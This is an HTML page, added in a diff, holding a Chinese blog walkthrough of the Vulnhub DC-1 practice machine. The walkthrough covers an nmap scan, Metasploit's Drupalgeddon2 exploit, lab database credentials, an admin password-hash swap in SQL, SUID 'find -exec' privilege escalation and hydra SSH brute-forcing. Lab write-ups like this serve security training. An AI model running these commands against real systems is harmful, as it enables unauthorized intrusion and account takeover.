@@ -1,0 +1,796 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [Vulnhub靶机通关]DC-1 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC]  外网渗透  主机发现   探端口及服务 1nmap -A -p- -v 192.168.5.53  123发现开放了22算口，开放了ssh服务，OpenSSH 6.0p1发现开放了80端口，存在web服务，Apache httpd 2.2.22，Drupal 7发现开放了111端口，开放了rpcbind服务   MSF攻击 Drupal 7之前碰到过一个，是有漏洞的，直接用MSF打">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Vulnhub靶机通关]DC-1">
+<meta property="og:url" content="http://example.com/2025/09/15/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]DC-1/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC]  外网渗透  主机发现   探端口及服务 1nmap -A -p- -v 192.168.5.53  123发现开放了22算口，开放了ssh服务，OpenSSH 6.0p1发现开放了80端口，存在web服务，Apache httpd 2.2.22，Drupal 7发现开放了111端口，开放了rpcbind服务   MSF攻击 Drupal 7之前碰到过一个，是有漏洞的，直接用MSF打">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915161813464.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915161914997.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915161941047.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915162337964.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/51e47913db2f88326d4c541d79fd8fe1.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/bf31fb221ed6f009fd6fac37ec94a71c.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/ea2df39d8bfe79f60437e8e901f5fafd.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/d6517389e0e8b733805e50eec8ec9242.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/5ae59cfee662cac8f59ed6d27206e312.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915164450975.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915164527238.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915162402156.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915162537678.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915163305891.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915163438218.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/image-20250915163614352.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/77bac7b29b97d3215420ff603de55029.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/ac11cf86ff45242730515cccab972245.png">
+<meta property="og:image" content="http://example.com/2025/09/15/images/7a58a66e26bee0d0918cdcc5438761a0.png">
+<meta property="article:published_time" content="2025-09-15T08:03:11.000Z">
+<meta property="article:modified_time" content="2026-03-18T07:36:17.878Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="Vulnhub">
+<meta property="article:tag" content="SUID提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/09/15/images/image-20250915161813464.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[Vulnhub靶机通关]DC-1">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[Vulnhub靶机通关]DC-1</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text"> 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text"> 探端口及服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text"> MSF攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-number">2.1.</span> <span class="toc-text"> flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-number">2.2.</span> <span class="toc-text"> flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-number">2.3.</span> <span class="toc-text"> flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4-suid%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text"> flag4-SUID提权</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[Vulnhub靶机通关]DC-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/09/15/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DDC-1/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-09-15T08:03:11.000Z" itemprop="datePublished">2025-09-15</time>
+    <time style="display: none;" id="post-update-time">2026-03-18</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/" data-aos="zoom-in">渗透</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<h2 id="外网渗透"><a class="markdownIt-Anchor" href="#外网渗透"></a> 外网渗透</h2>
+<h3 id="主机发现"><a class="markdownIt-Anchor" href="#主机发现"></a> 主机发现</h3>
+<p><img src="../images/image-20250915161813464.png" alt="image-20250915161813464" /></p>
+<h3 id="探端口及服务"><a class="markdownIt-Anchor" href="#探端口及服务"></a> 探端口及服务</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -v 192.168.5.53</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250915161914997.png" alt="image-20250915161914997" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现开放了22算口，开放了ssh服务，OpenSSH 6.0p1</span><br><span class="line">发现开放了80端口，存在web服务，Apache httpd 2.2.22，Drupal 7</span><br><span class="line">发现开放了111端口，开放了rpcbind服务</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250915161941047.png" alt="image-20250915161941047" /></p>
+<h3 id="msf攻击"><a class="markdownIt-Anchor" href="#msf攻击"></a> MSF攻击</h3>
+<p>Drupal 7之前碰到过一个，是有漏洞的，直接用MSF打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rhosts 192.168.5.53</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250915162337964.png" alt="image-20250915162337964" /></p>
+<p>得到shell</p>
+<h2 id="后渗透"><a class="markdownIt-Anchor" href="#后渗透"></a> 后渗透</h2>
+<h3 id="flag1"><a class="markdownIt-Anchor" href="#flag1"></a> flag1</h3>
+<p>查看www目录下文件，发现flag1.txt文件，打开发现提示信息，内容提示寻找站点的配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you</span><br></pre></td></tr></table></figure>
+<h3 id="flag2"><a class="markdownIt-Anchor" href="#flag2"></a> flag2</h3>
+<blockquote>
+<p>Drupal的默认配置文件为</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
+<p><img src="../images/51e47913db2f88326d4c541d79fd8fe1.png" alt="在这里插入图片描述" /></p>
+<blockquote>
+<p>查看文件内容</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/www/sites/default/settings.php</span><br></pre></td></tr></table></figure>
+<p>发现了flag2和数据库的账号密码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;drupaldb&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;dbuser&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;R0ck3t&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;driver&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br></pre></td></tr></table></figure>
+<p>flag2提示，提升权限为root来查看敏感文件，或者直接爆破</p>
+<p><img src="../images/bf31fb221ed6f009fd6fac37ec94a71c.png" alt="在这里插入图片描述" /></p>
+<h3 id="flag3"><a class="markdownIt-Anchor" href="#flag3"></a> flag3</h3>
+<p>进入数据库查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br></pre></td></tr></table></figure>
+<p>查看数据库，切换到drupaldb数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">databases;</span><br><span class="line">use drupaldb;</span><br></pre></td></tr></table></figure>
+<p>查看查找默认的Drupal user 表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * from <span class="built_in">users</span>;</span><br></pre></td></tr></table></figure>
+<p>发现admin信息</p>
+<p><img src="../images/ea2df39d8bfe79f60437e8e901f5fafd.png" alt="在这里插入图片描述" /></p>
+<p>置换drupal密码:<a target="_blank" rel="noopener" href="http://drupalchina.cn/node/2128">分享：忘记Drupal的管理员密码的解决办法 | Drupal China</a></p>
+<p>进入www目录,站点路径下执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh 新密码</span><br></pre></td></tr></table></figure>
+<p><img src="../images/d6517389e0e8b733805e50eec8ec9242.png" alt="在这里插入图片描述" /></p>
+<p>然后再进入数据库中把密码字段进行替换<br />
+进入mysql，输入密码，切换到drupaldb数据库</p>
+<p><img src="../images/5ae59cfee662cac8f59ed6d27206e312.png" alt="在这里插入图片描述" /></p>
+<p>将pass字段进行替换</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span>&quot;$S$DW/j0Hhhx6pIBV4ZkoBp3mv/5l8reTwEBdpgzB/x8awTYUfFkd2k&quot; <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></figure>
+<p>返回web站点登录：<code>admin/111111</code></p>
+<p>成功登录</p>
+<p><img src="../images/image-20250915164450975.png" alt="image-20250915164450975" /></p>
+<p>登陆战点之后，随便翻一番，发现flag3，</p>
+<p><code>/node#overlay=admin/content</code></p>
+<p><img src="../images/image-20250915164527238.png" alt="image-20250915164527238" /></p>
+<p>点击flag3进入，发现提示信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line">大致意思是提权并提示 -exec，想到suid提权 find 命令</span><br></pre></td></tr></table></figure>
+<h3 id="flag4-suid提权"><a class="markdownIt-Anchor" href="#flag4-suid提权"></a> flag4-SUID提权</h3>
+<p><img src="../images/image-20250915162402156.png" alt="image-20250915162402156" /></p>
+<p>目前是www-data权限，需提权</p>
+<p>我们可以利用综合脚本来探测suid权限的文件</p>
+<p><img src="../images/image-20250915162537678.png" alt="image-20250915162537678" /></p>
+<p>但既然是学习，我们还是手动提权吧</p>
+<p>用python反弹一个交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+<p>使用命令查看 suid 权限的可执行二进制程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250915163305891.png" alt="image-20250915163305891" /></p>
+<p>发现find命令</p>
+<p>使用命令测试，发现为root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch 1</span><br><span class="line">ls</span><br><span class="line">find / -name 1 -exec &quot;whoami&quot; \;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250915163438218.png" alt="image-20250915163438218" /></p>
+<p>我们切换语句进入shell，执行whoami查看当前权限，执行ls查看当前目录下文件，切换到root目录，查看文件，发现cat thefinalflag.txt文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 1 -exec &quot;/bin/sh&quot; \;   </span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250915163614352.png" alt="image-20250915163614352" /></p>
+<p>此时我们查看 /etc/passwd 文件，发现存在 flag4 用户，我们也可以使用 hydra 进行爆破</p>
+<p><img src="../images/77bac7b29b97d3215420ff603de55029.png" alt="在这里插入图片描述" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l flag4 -P /root/Desktop/pass.txt ssh://192.168.5.53</span><br></pre></td></tr></table></figure>
+<p><code>-l</code> 指定用户名</p>
+<p><code>-P</code> 加载密码字典（自定义)</p>
+<p><code>ssh://ip</code> 指定使用协议和ip地址</p>
+<p><img src="../images/ac11cf86ff45242730515cccab972245.png" alt="在这里插入图片描述" /></p>
+<p>SSH连接登录，拿到flag4权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh flag4@192.168.233.177</span><br></pre></td></tr></table></figure>
+<p><img src="../images/7a58a66e26bee0d0918cdcc5438761a0.png" alt="在这里插入图片描述" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SUID%E6%8F%90%E6%9D%83/" rel="tag">SUID提权</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/bizhi1.png" data-sizes="auto" alt="[Vulnhub靶机通关]toppo-1" class="lazyload">
+          
+        
+        <a href="/2025/09/15/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5Dtoppo-1/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [Vulnhub靶机通关]toppo-1
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="N1CTF Junior 2025 2/2 Web" class="lazyload">
+        
+      
+      <a href="/2025/09/15/N1CTF%20Junior%202025Web/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          N1CTF Junior 2025 2/2 Web
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text"> 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text"> 探端口及服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text"> MSF攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-number">2.1.</span> <span class="toc-text"> flag1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2"><span class="toc-number">2.2.</span> <span class="toc-text"> flag2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-number">2.3.</span> <span class="toc-text"> flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4-suid%E6%8F%90%E6%9D%83"><span class="toc-number">2.4.</span> <span class="toc-text"> flag4-SUID提权</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
